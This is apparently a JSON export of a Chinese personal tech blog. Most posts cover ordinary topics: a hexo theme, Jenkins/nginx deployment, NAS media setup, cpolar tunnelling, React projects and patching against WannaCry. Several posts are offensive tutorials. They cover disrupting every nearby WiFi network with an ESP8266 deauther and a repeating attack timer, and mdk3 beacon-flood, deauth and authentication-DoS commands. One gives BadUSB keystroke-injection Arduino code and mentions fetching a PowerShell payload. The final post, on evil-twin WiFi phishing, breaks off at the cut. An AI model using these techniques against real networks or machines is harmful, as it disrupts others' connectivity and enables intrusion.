[{"title":"hexo主题","date":"2020-01-31T12:45:44.000Z","path":"2020/01/31/diary-2020-0131-01/","text":"正文&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于yilia主题作者很久没有更新过了，所以这里我们对该主题做了一些改动和优化。 在原主题原基础上做了以下功能升级1，新增天气插件2，新增一些动画特效3，新增桌面小人看板娘并且拖动4，新增网易云音乐插件5，新增gitment评论6，新增gitalk评论7，新增文章置顶8，修复了一些加载报错信息9，添加字数阅读时长统计10，新增文章版权信息11，新增页面浏览进度条12，修改社交标签中微信二维码展示 开始使用安装12cd ./themes/git clone https://github.com/Y00z/hexo-theme-y00z.git hexo-theme-y00z 使用修改hexo根目录下的 _config.yml配置文件 1theme: hexo-theme-y00z 更新12cd themes/hexo-theme-y00zgit pull","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"hexo","slug":"hexo","permalink":"http://y00z.github.io/tags/hexo/"}]},{"title":"前端nginx配置+jenkins+github自动部署上线","date":"2019-11-07T07:53:53.000Z","path":"2019/11/07/diary-2019-1107-01/","text":"正文&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在我们前端开发中，大部分发布等都是由运维帮我们操作，对于项目的自动化部署发布上线等等，这些事作为开发我们也有必要了解，下面就用jenkins来完成项目的自动化构建部署上线流程。 Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。 jenkins构建部署大致分两种， 手动触发式构建：这种就是我们把代码push到git仓库后，需要登陆到jenkins后台，然后手动点击一键构建后才开始构建和部署到对应的服务器。自动触发式构建：这种是当我们push代码到指定的分支后，jenkins就会自动开始构建和部署。这里我们建议测服上可以使用自动触发构建，在生产环境上使用手动触发构建。这里我们演示第一种手动触发构建。 初始化首先我们vue-cli来初始化一个项目， nginx配置接下来nginx配置 nginx配置目录/etc/nginx/nginx.conf 首先我们先考虑都一个服务器上可能会配置多个主机名，所以我们在nginx.conf配置中加上一行配置可从外部导入，这样nginx.conf主配置主页配置nginx共用等参数，导入的配置专门用来为多个主机名服务 1include /etc/nginx/sites-enabled/*; 之后在sites-enabled下新建主机名配置文件，这里用www.y00z.com为例 我们把nginx.conf中的server参数拷贝到www.y00z.com配置文件中。 nginx.conf配置文件如下： 1234567891011121314151617181920#user nobody;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;#pid logs/nginx.pid;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; #access_log logs/access.log main; sendfile on; include servers/*; include /usr/local/etc/nginx/sites-enabled/*;&#125; www.y00z.com配置文件如下： 12345678910111213141516171819202122server &#123; listen 80; server_name www,y00z.com; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; root /Users/yooz/Documents/project/test01/dist; try_files $uri $uri/ @router; index index.html index.htm; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125; 配置完成后我们就可以启动nginx了， 执行1nginx -c /usr/local/etc/nginx/nginx.conf 如果没有提示就是启动成功了， 最后由于本人没服务器和域名，我们就通过改hosts来模拟服务器域名解析上线页面预览。 到这里就完成来一个前端项目的nginx部署上线流程。 jenkins部署下面可以给大家介绍一下docker+jenkins部署 首选jenkins我们下载第二个，这个版本是官网在维护的，版本也比较新。 我可以参考下jenkins官网的docker启动https://github.com/jenkinsci/docker 1docker run -d -v /var/jenkins_home:/var/jenkins_home -p 8080:8080 -p 50000:50000 jenkins/jenkins:lts 将远程的/var/jenkins_home目录映射到本地的jenkins_home目录中, (左边为本地目录，右边为jenkins容器的) 执行后就可以打开8080端口进入jenkins 解锁密码文件我们可以根据映射到本地的文件查看 选择第一个安装推荐的插件 接下来就在初始化安装了，这里要等的时间要久一些。 安装完成后创建管理员用户 jenkins的地址就选择默认的。 然后就可以开始用了 jenkins配置到这里jenkins就安装好了，我们就可以开始了jenkins的项目任务配置，首先来新建一个任务 手动触发式构建这里我们先来配置jenkins的手动触发式构建，新建一个自由风格的软件项目。 然后在下面的源码管理中的仓库地址还有账号密码填好，jenkins会自动登陆你的仓库然后去指定的git地址拉代码。 如果我们的前端项目对node版本有要求的话我们需要安装一下nvm插件。 在系统管理-&gt;插件管理搜索nvm-wrapper勾选后直接安装， 安装好后回到新建项目这里，就会多出一个nvm选项，勾选，然后输上我们需要的node版本，其他的保持默认就行了。 最后的配置 这一步比较重要，就是在点击构建的时候，我们要做哪些操作，执行哪些shell。由于我是在本地测试使用的，jenkins和web服务器都在一台服务器上，一般都是分开不同的服务器，所有免除了连接ssh和scp操作。 到这里jenkins配置就结束了，我们可以直接构建项目了 jenkins新建的项目目录在下/var/jenkins_home/workspace/构建完成后，我们可以到这个目录来，可以看到jenkins已经把项目克隆到了本地，并且执行了shell命令，已经编译好了， 最后我们只需要更改一下nginx配置，把网页的root路径改成/var/jenkins_home/workspace/test01/dist/ 最后测试，我们更改代码后直接提交，然后在jenkins中立即构建，不一会儿就可以看到我们的最新代码在中显示了。 手动触发构建到这里就结束了， 自动触发式构建自动触发式构建需要配合github，我们需要到github项目的设置页面中配置一下你的jenkins地址。https://***.***.***/github-webhook/其中的这个路径github-webhook是写死固定的。 然后再配置一下github的个人访问令牌。然后勾选图中的设置 完成后会生成一个token，生成token需要马上保存下来。这个token只会显示一次。 然后github的配置都完成了，我们再来配置jenkins。 在jenkins的配置页面 系统管理-&gt;系统配置-&gt;Github 服务器 先勾选配置项，再添加一个凭据。图中的secret填的就是我们刚刚在github中生成的token 添加完成后可以测试连接一下。如果连接成功的话就会如图显示。 最后我们可以在jenkins添加项目了，添加项目的步骤和上面的手动构建步骤一样的，其中需要勾选github hook的选项到这里我们就完成了自动触发式构建，在我们push代码之后就会立即执行jenkins中配置的构建脚本来发布 这里也可以看到github中的push记录。 总结到这里就结束了，根据上面的案例，其实jenkins配置还是很简单的，主要是最后的配置所执行的shell是发布的关键。配置好了后我们就可以只自动化构建部署。","tags":[{"name":"开发","slug":"开发","permalink":"http://y00z.github.io/tags/开发/"}]},{"title":"mac读写NTFS移动硬盘&u盘","date":"2019-09-20T02:49:37.000Z","path":"2019/09/20/diary-2019-0920-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;装了nas后，mac里有一些资源需要拷贝到nas上，但是mac通过wifi把资源上传到nas中速度不太理想，而且不稳定还经常卡住。所以我想着先把资源拷到移动硬盘中，再从移动硬盘拷贝到nas中，usb传输速度快而且稳定些，但是mac是只能读NTFS硬盘不能写，然后下面就介绍一个读写NTFS硬盘的方法 先查看硬盘的uuid1diskutil info /Volumes/硬盘名称 | grep UUID 然后在 /etc/fstab 文件中输入 1LABEL=uuid none ntfs rw,auto,nobrowse 如果有多个分区或者多个设备也可以写多个。 保存推出后推出硬盘然后再重新插上，这个时候不会提示有硬盘插入了，在【程序-实用工具-磁盘工具】中可以看到我们的硬盘。 这个时候我们就可以随意的读写硬盘中的文件了。","tags":[{"name":"MacOS","slug":"MacOS","permalink":"http://y00z.github.io/tags/MacOS/"}]},{"title":"打造家庭影院+tr离线下载","date":"2019-09-12T06:20:07.000Z","path":"2019/09/12/diary-2019-0912-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们的群晖nas全部都搞好后就可以开始玩儿了，我是比较爱看电影的人，平时如果看到很喜欢的电影看完后就会下载下来放到移动硬盘里，一直到现在已经堆积了许多电影，现在我们有了nas可以搭建一个家庭影院，可以来用更高大上的方式来看电影。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先我们要装个家庭影院程序，这里我用的是emby，当然还有其他的plex以及jellyfin，jellyfin说是在emby收费后引起了一些核心开发人员的不满，然后在emby基础上单独开发了jellyfin，我在使用emby中暂时还没发现什么问题。 安装emby(家庭影院)首先我们要在套件中心中设置运行安装第三方套件来源 然后我们在套件中心中新增emby的套件来源 1https://synology.emby.media/?package_repository=360efc6e-de72-4073-b603-2bfbd7001586 新增完毕后就可以在社群中找到并且安装了。 emby初始化安装完毕后在应用详情中可以看到emby地址，就可以直接进去初始化设置了。 设置一直下一步即可，安装完成之后就可以看到emby后台了 等电影扫描完毕之后，我们就可以爱奇艺一样可以看到电影海报以及电影详情了 安装tr(离线下载)接下来就是安装tr来离线下载。 设置完成后同样也是需要我们在套件中心中新增tr的第三方套件来源 1http://packages.synocommunity.com/ 然后在社群中找到tr下载安装 tr初始化安装完成后会弹出初始化设置， 保持默认就行了 设置一下密码 同样在应用详情中可以看到tr地址，可以直接进去。 进去后我们可以看到tr原生页面比较丑，也没有中文。 tr安装增强汉化包我们可以安装一个tr的ui增强汉化包 先连上群晖的ssh，然后直接用wget下载ui增强汉化包的安装脚本 1wget https://github.com/ronggang/transmission-web-control/raw/master/release/install-tr-control-cn.sh 给脚本加上可以执行权限 1chmod +x install-tr-control-cn.sh 有了权限后就直接执行该脚本 1./install-tr-control-cn.sh 根据提示来一键安装 安装完成后可以再看tr，页面好看多了。","tags":[{"name":"nas","slug":"nas","permalink":"http://y00z.github.io/tags/nas/"}]},{"title":"内网穿透","date":"2019-09-11T02:17:18.000Z","path":"2019/09/11/diary-2019-0911-01/","text":"简介 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\b\b\b\b有了nas后，就一直想要远程管理访问nas，用来远程下载等等，在贫穷的我没有服务器以及公网ip的情况下如何远程访问，之前一直用的是zerotier来组建的内网，但是不知道最近怎么回事，zerotier最近抽风了，组的内网一直显示不出连接地址。然后现在又找到了另外一个内网穿透的办法。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\b\b\b\bcpolar通过安全隧道将NAT和防火墙后面的本地服务器暴露给公网。 安装cpolar首先需要下载cpolar，如果是群晖的话直接选择linux版本，同时需要在其官网注册账号 配置cpolar然后把下载的压缩包上传到服务器并且解压，得出cpolar文件。执行 1' ./cpolar authtoken &lt;YOUR_AUTH_TOKEN&gt; ' 在cpolar官网个人中心查看。 执行成功后该服务器就连接你的cpolar账户，同时会返回你的配置文件 这个时候我们就可以直接执行命令来进行内网穿透了。 1'./cpolar http 5000' 然后就打开里面的url可以直接访问到我们的群晖了 cpolar多隧道穿透不过有一点就是这样启动只能一个端口穿透，如果我们想访问web桌面同时想连接ssh呢，我们可以通过修改配置文件来实现多个端口内网穿透。 刚刚我们连接cpolar账户的时候有返回配置文件的目录，我们把配置文件修改为。 12345678910authtoken: xxxxxxxxx 您的token认证串tunnels: #多隧道配置 nas_web: #隧道名称，web管理隧道(自定义) addr: 5000 #本地映射的端口号，这里是NAS的5000端口号 proto: http #隧道的协议是http协议 region: cn #地区，cn是指中国区，如果不填写，默认为us美国区 nas_driver: #隧道名称，ssh隧道(自定义) addr: 22 #默认端口为本地的22端口 proto: tcp #协议为TCP 注意，注意，注意，每一个缩进必须2个空格。（最好自己输，不要复制。） 然后执行1./cpolar start-all 这个时候配置文件里的隧道就都穿透到了外网，我们可以在cpolar官网的个人中心查看， 这样我们就可以使用多个穿透到外网的端口了。 连接外网的ssh 开机自启可以让cpolar后台运行 1nohup /root/cpolar start-all -config=/root/.cpolar/cpolar.yml -log=stdout &amp; 然后查看后台进程。 1ps -aux | grep cpolar | grep -v grep cpolar开机自启我们可以写一个shell脚本，用来开机启动 12vim /root/cpolar.shnohup /root/cpolar start-all -config=/root/.cpolar/cpolar.yml -log=stdout &amp; 记得给脚本加上执行权限 1chmod +x cpolar.sh 然后编辑该文件 1vim /etc/rc 在最后一行加上我们创建shell脚本路径 最后reboot重启， 1ps -aux | grep cpolar | grep -v grep 可以查看到内网穿透已经启动了","tags":[{"name":"路由器","slug":"路由器","permalink":"http://y00z.github.io/tags/路由器/"},{"name":"nas","slug":"nas","permalink":"http://y00z.github.io/tags/nas/"}]},{"title":"蜗牛星际搭建pve+黑群晖nas+软路由lede","date":"2019-06-25T07:34:55.000Z","path":"2019/06/25/diary-2019-0625-01/","text":"简介 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\b\b又是时隔一年多没有写博客了，最近入手了一个新玩具，蜗牛星际，说是用来挖CAI虚拟货币的矿机，结果被跑路了，原价5，6千的主机现在统统只要2百块。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\b\b看到一些社区上很多人买来蜗牛星际做nas，看了多个帖子后自己也决定买一个来玩一玩，发现大多数社区教程里都少里一个细节，导致装黑裙的时候出问题一直未解决，后面折腾了一个星期终于弄好了,细节部分后面会用红色标记起来。 机器长这样 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\b\b我买的是B款四个盘位 破解千兆 双口的，可以用来做lede软路由+pve(经过实测，蜗牛星际性能有限，同时装这两个容易性能崩溃) 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们这次安装主要是在蜗牛星际中装一个pve虚拟机，然后在pve虚拟机再装lede以及群晖，当然也可以其他的linux，和vmware一样。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pve和lede的安装可以参考这两篇博客，写的非常详细(安装pve) 、(安装lede)， 群晖安装 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果已经安装了pve，我们就可以直接来装群晖6.1.7了， 先创建dsm虚拟机，硬盘选择sata类型，网卡选择E1000，其他的全部默认，创建完毕后不要启动。 ssh连接pve，把img2kvm和synoboot.img引导程序上传至pve， 1./img2kvm synoboot.img 101 vm-101-disk-1 这个101是虚拟机的编号，看编号来改这个命令。完成后pve面板下的dsm虚拟机会多出一个未使用的磁盘。 这个磁盘就是我们的dsm的引导，我们双击这个磁盘，选择sata类型，然后再把引导顺序改为我们刚刚新增的磁盘，之后就可以启动虚拟机了 启动虚拟机后可以打开Synology Assistant程序，来搜索我们局域网内的群晖机器，然后在浏览器中打开群晖所在的ip，就可以直接用pat安装程序安装了。(有时候Synology Assistant会搜不到，这个时候可以登陆路由器看ip的分配来找群晖的地址) 经过多次实测，蜗牛星际不适合用来搭建pve+黑裙+lede，性能极其有限，拷贝个文件会让黑裙内存直接飙满崩溃，导致黑裙文件损坏，然后只能重装黑裙。截稿这天我已经卸载了pve，直装黑裙。如果想玩lede软路由，可以买两台蜗牛星际，一台装群晖，一台装lede，或者动手能力强的同学想一台机器搞定，可以尝试把蜗牛星际里面的硬件更换性能更高的。参考 群晖两种直装的方式直装黑裙的话分两种 u盘引导安装第一种u盘引导安装(推荐)，机器每次开机启动的时候，机器必须插上u盘引导启动。这种方法是u盘安装群晖的引导镜像，然后开机的时候安装，将群晖的安装镜像安装到硬盘中，这样就把群晖拆了两份，一个引导在u盘，一个群晖系统在硬盘，这种安装方式确定就是开机必须要u盘启动，好处就是稳定可使用官方镜像安装。 二合一安装第二种二合一安装，顾名思义就是把引导镜像和群晖系统合在了一起，开机时不需要u盘，可以直接硬盘引导启动，但是这种二合一的镜像一般都是由一些网络上的人员制作导出的，一个二合一镜像将近15g。这种安装方式好处就是不需要u盘，坏处就是不稳定，并且这种网络上的人制作出来的镜像就相当于当年xp的ghost镜像，不安全。 这两种黑裙的直装方式比较简单就不详情描述了，第一种直接把引导镜像写入u盘，第二种需要进入pe，再把二合一镜像写入硬盘。 工具下载地址 https://pan.baidu.com/s/1twe237u5uHlkfKl4DWusIg 提取码: ef8k","tags":[{"name":"路由器","slug":"路由器","permalink":"http://y00z.github.io/tags/路由器/"},{"name":"nas","slug":"nas","permalink":"http://y00z.github.io/tags/nas/"}]},{"title":"ESP8266攻击wifi","date":"2018-06-09T10:21:28.000Z","path":"2018/06/09/diary-2018-0609-01/","text":"简介 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很久没有写过博客了，自从来到这边后就几乎没有了自己的空余时间。这个ESP8266也是从白忙中挤出时间来弄的。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于ESP8266我也在之前的文章中也提到过，(点我)，使用这个需要ESP8266芯片中烧录bin文件，芯片在淘宝中可购到。 正文 需要的设备 ESP8266芯片 nodemcu烧录程序 bin固件 芯片中有两个按钮，一个reset，一个flash 芯片准备好后，需要一条microUSB线和电脑连接，连接后会自动安装驱动程序。（实测中win10会自动安装，win7需要自行安装，连接电脑后可下载驱动精灵或者驱动大师检测一下） 打开烧录程序，config选项，选择bin固件 再选择bin固件的信息，我们的固件不到1m就选择1m的。 最后选择串口，然后开始烧录 烧录结束后，按下芯片的reset按钮，重启一下。 之后搜索wifi，如果有搜索pwned的wifi名，就说明烧录成功了。默认密码为：deauther 连接wifi后打开浏览器进入192.168.4.1 进入控制台 下一步，然后直接SCAN APS扫描所有的wifi。 扫描到wifi后，SELECT ALL选择所有的 然后切换到ATTACKS标签，可以看到Targets中有我们选择的wifi数量 然后直接start，这个时候查看wifi，会发现选择的wifi已经全部连接不上， 由于我们使用的是小芯片，禁不起长时间的攻击，时间长后就会芯片发热自动停止。所有我们可以自己在浏览器中写一个定时任务。 setInterval(function(){start(0)},10000) 攻击10秒钟，然后暂停10秒钟，不停循环，可以不停攻击同时可以防止芯片过热。 下载 nodemcu烧录程序 https://github.com/nodemcu/nodemcu-flasher bin固件 https://github.com/spacehuhn/esp8266_deauther","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"wifi","slug":"wifi","permalink":"http://y00z.github.io/tags/wifi/"}]},{"title":"React-Native找厕所项目+Nodejs服务端","date":"2017-07-26T05:21:43.000Z","path":"2017/07/26/diary-2017-0726-01/","text":"简介 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;个人的一个React-Native项目，前几天买了一台ipad的,正好同时适配了ios/android两个平台并且进行了优化。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过调用高德地图LBS定位并且寻找附近的厕所自动导航，同时支持阅读新闻，定位获取城区天气等，使用官方推荐的react-navigation和最新的FlatList组件，并且使用的是reate-react-native-app模式开发的app，这个模式在上一篇文章有介绍(点我)，代码及其紧凑扩展性强(官推的导航组件太好用了)，同时感谢vczero大哥提供的学习资料素材。 正文 服务器 NodeJs express4 mongodb 服务器同时用了session持久化，把用户登录状态保存起来，帐号密码并没有植入到数据库中，而是固定的帐号admin，密码123456目前只是用户录入的新闻数据是存储在数据库中的，因为服务器并不是项目中的主要。之前也有发过Nodejs电影站的开源项目，里面所有数据是全部都存入到数据库中的(点我) app客户端 FlatList react-navigation 高德地图api 同时适配了ios/android两个平台并且进行了优化，使用的reate-react-native-app模式开发,该模式详情(点我) 运行 服务端运行 npm install mongod –dbpath D:\\db node app 客户端运行 npm install npm start 效果图 android ios 项目源码地址 服务端 https://github.com/Y00z/react-navie_toilet_server app客户端 https://github.com/Y00z/react-navie_toilet","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"NodeJs","slug":"NodeJs","permalink":"http://y00z.github.io/tags/NodeJs/"},{"name":"React-Native","slug":"React-Native","permalink":"http://y00z.github.io/tags/React-Native/"}]},{"title":"React-Native新颖的开发模式","date":"2017-07-19T07:07:49.000Z","path":"2017/07/19/diary-2017-0719-01/","text":"前言&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个React-Native非常新颖的模式，类似于微信小程序，通过扫描二维码来打开app，避免了烦琐的安卓和ios打包环境。 正文需要两个工具 create-react-native-app Expo 第一个工具直接通过npm安装即可 npm install -g create-react-native-app第二个工具是一个手机app，官网下载即可 https://expo.io/ 首先通过create-react-native YoozApp来初始化一个项目 可以看到没有ios和安卓的入口文件和工程目录，只有js文件。App.js就是项目的入口文件。 接下来cd进入到项目目录中来，运行命令npm start，就会生成二维码，通过第二个工具我们在手机上装的expo扫描这个二维码就能直接打开我们的react-native应用了，类似小程序。 这个React-Native开发模式避免了烦琐的编译步骤，不管电脑是 windows 还是mac ，也不用管手机是苹果还是安卓，都可以进行所有平台的代码编写和真机测试。 注意 但是这种方式限制了打开方式，也就是只能在Expo中打开。所以如果要打包app到应用市场的话，那么这个开发模式并不适用。 不过我们可以用这个来学习React-Native开发，也可以使用这个完成app开发后，要打包的话，可以直接把代码copy到打包的项目中。 示例安装好第二个工具，官网https://expo.io/ app页面 扫描过的二维码记录都会保存在页面中 安装完成后打开app，扫描二维码，下面这个二维码是react-navigation的demo 扫描后即可直接打开React-Native应用，无需安装。","tags":[{"name":"React-Native","slug":"React-Native","permalink":"http://y00z.github.io/tags/React-Native/"}]},{"title":"wifi干扰","date":"2017-06-08T02:13:25.000Z","path":"2017/06/08/diary-2017-0628-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就在网上看到过一个固件，烧录在开发板中，然后可以用来攻击wifi和干扰wifi，其实原理很简单，干扰可以使用mkd3来完成，攻击可以使用aircrack-ng套件来完成，早在之前我就发过使用aircrack-ng攻击的相关文章(点我)，只是这个固件把这两个结合在了一起，喜欢折腾硬件的朋友可以去试一试。 固件地址https://github.com/spacehuhn/esp8266_deauther 干扰&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很早之前就知道了wifi干扰，就是创建数十个杂乱的wifi来干扰正常的信号接收，前几天突然看到有人用wifi来表白，真是脑洞大开。然后我测试了一下也可以使用mdk3的wifi干扰来实现。 我们使用的是mdk3中的b模块(b-Beacon Flood Mode) mdk3 wlan0 b -g -c 11 -c 信道 -g 54Mbit模式 ↓ 这种是创建数十个杂乱wifi信号来干扰。 ↓ 下面我们可以来创建自定义wifi。 首先把wifi名一行一个的保存在文本中。 ↓ 我们先创建4个，当然也可以更多。 mdk3 wlan0 b -g -c 11 -f /root/ap.txt -f 自定义wifi名 ↓ 然后会创建出以我们保存在文本中的名字的wifi名。↓ 题外下面再来说说攻击模块，我在前面说过攻击模块还是aircrack-ng套件比较好用(点我) 洪水攻击mdk3下有两个攻击方式其中一个就是洪水攻击，d模块(De-authentication Flood Attack) mdk3 wlan0 d -c 11 所有连接了频道为11的ap设备全部断线。 同时也有个设置白名单 mdk3 mon0 d -c 11 -w &quot;whitelist.txt&quot; -w 白名单 -b 黑名单 除了保存在白名单中的设备，其他全部断线。 身份验证攻击还有一个种就是身份验证攻击，向wifi发送随机的大量连接请求，a模块(Authentication DoS mode) mdk3 wlan0 a -a wifi_MAC -a wifi的mac地址","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"React开发新闻网适配pc端及移动端","date":"2017-05-30T11:07:12.000Z","path":"2017/05/30/diary-2017-0530-01/","text":"前言&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;React项目，我是先接触的React-Native，并且也开发过几个小项目。由于React-Native是由React衍生过来的，所以学习React起来也非常快，得心应手。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，代码简洁明了，封装性很强，比较适合初识react的同学了解和学习&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;支持用户注册,登录退出,新闻收藏，评论等。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;项目同时对pc端以及移动端做了相应的适配，项目用的es6 简介 聚合新闻接口 UI框架,antd 路由react-router 演示(动画较大,请耐心等待) pc端 移动端 运行 npm install npm start 项目源码地址 https://github.com/Y00z/react_news","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"React","slug":"React","permalink":"http://y00z.github.io/tags/React/"}]},{"title":"防范ONION勒索病毒","date":"2017-05-13T05:03:16.000Z","path":"2017/05/13/diary-2017-0513-01/","text":"前言&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;话说周末真的是搞大新闻时间，今早一醒就又被一个勒索病毒给刷了屏，稍微看了一下感觉没啥，就是一个古老的勒索软件利用了一个月前NSA美国安全局内部曝光的smb漏洞来传播，可怕的是这个NSA的这个漏洞非常厉害，所以传播的很快，我之前也发过NSA曝光的漏洞相关报道(点我)，如果有设备中招了，病毒就会利用该设备来扫描内网中其他开445的设备并且攻击，很多学校机房和公用电脑都是年久失修的，而且学校都是一个大内网，所以学校是重灾区。 漏洞防御这个病毒就是利用之前NSA爆出的smb漏洞来传播的，所有防范这个病毒其实就是只要防范之前NSA爆出的smb漏洞就可以了。 3个办法 ①控制面板→windows防火墙→高级设置→入站规则→新建规则→端口→tcp→下面输入“135,445”→阻止连接→再新建一次规则里面选udp ②打上最新官方补丁下载地址：https://technet.microsoft.com/zh-cn/library/security/MS17-010 ③XP和win2003微软已经停止维护的可以使用 360的检测与修复工具 ：https://dl.360safe.com/nsa/nsatool.exe 文件修复最新消息 出了两个文件恢复工具，并不是解密工具，只能恢复一部分文件第一个是360出的恢复工具。 http://weibo.com/ttarticle/p/show?id=2309404107129664487886 第二个是不知名公司出的恢复工具 http://www.youxia.org/29083.html 最新消息,可恢复全部数据 阿里出了解密工具，可以完全恢复所有数据，前提是计算机没有关机过，原理就是加密后，key会存在内存中，可以在内存中找到key，和神器mimikatz原理差不多一样。 https://yq.aliyun.com/articles/86599?utm_content=m_21495","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"制作BadUSB","date":"2017-05-12T07:14:09.000Z","path":"2017/05/12/diary-2017-0512-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BadUSB早在2014年底的PacSec会议上便已经提出，这是USB协议中的一个漏洞————USB设备可以伪装成为其他任何设备，例如输入设备、网卡等等。这个漏洞目前还没有得到修复，几乎可以说在有合适的脚本的情况下，只要能够插进去，没有什么是黑不掉的！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;差不多的原理就是伪装成HID设备如键盘或者鼠标，然后模拟键盘按键来打开cmd执行powershell指令对电脑进行攻击，而且这种攻击是无法拦截的。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;制作BadUsb有两个方法，一种是Arduino开发板，另一种PS2251-03的微处理器的U盘，可以在这里看U盘的列表型号 ，这里我使用的第一种制作方法。(ps：我本来用的是第二种方法，买了指定型号的u盘，买回来后发现微处理器并不是PS2251-03微处理器，然后才换了第一种方法) 材料* Arduino Leonardo * Arduino IDE * micro usb数据线 Arduino Leonardo 可以去水深宝淘到。 Arduino IDE 下载地址：https://www.arduino.cc/en/Main/Software Arduino Leonardo ↓ 拆开看看 ↓ 使用micro usb 安卓数据线就可以和电脑连接了 ↓ Arduino IDE打开后默认是这样的 ↓ 同时需要把IDE菜单=&gt;工具的两个选项选一下。 ↓ 这个选项需要电脑连接开发板后才有 ↓ 然后可以来编写代码了。我们可以先来写一个hello world ↓ 123456789101112131415161718192021222324252627282930313233#include&lt;Keyboard.h&gt; //包含键盘模块头文件void setup() &#123; // put your setup code here, to run once: Keyboard.begin();//开始键盘通信 delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样 Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题 Keyboard.release(KEY_CAPS_LOCK); //释放大写键 delay(500); Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 delay(500); Keyboard.press('r');//按下r键 delay(500); Keyboard.release(KEY_LEFT_GUI);//松掉win键 Keyboard.release('r');//松掉r键 delay(500); Keyboard.println(\"cmd\");//输入cmd进入DOS delay(500); Keyboard.press(KEY_RETURN); //按下回车键 Keyboard.release(KEY_RETURN); //释放回车键 delay(500); Keyboard.println(\"echo hello world\"); Keyboard.press(KEY_RETURN); //按下回车键 Keyboard.release(KEY_RETURN); //释放回车键 delay(500); Keyboard.press(KEY_CAPS_LOCK); //按下大写键 Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键 delay(500); Keyboard.end();//结束键盘通讯&#125;void loop() &#123; // put your main code here, to run repeatedly:&#125; 然后编译验证 ↓ 如果提示这个就说明编译验证成功了 ↓ 接下来就可以把代码上传到Arduino Leonardo，来完成BadUSB制作的最后一步。 ↓ 上传成功后会自动断开USB然后再次连接并且执行代码。 会根据代码来依次执行，先按出win+r键，然后按出cmd 回车，最后输入echo hello world。 总结当然我们可以执行powershell指令来下载自己的payload然后执行，或者其他一些代码。 我这里放几个例子https://github.com/Y00z/BadUSB。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"wifi破解之社工钓鱼","date":"2017-05-07T13:02:11.000Z","path":"2017/05/07/diary-2017-0507-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，我在之前的文章中说过抓握手包破解，这里说一下社工钓鱼来破解得到wifi密码。 攻击原理 抓取握手包 创建一个和目标wifi同名的ap热点， 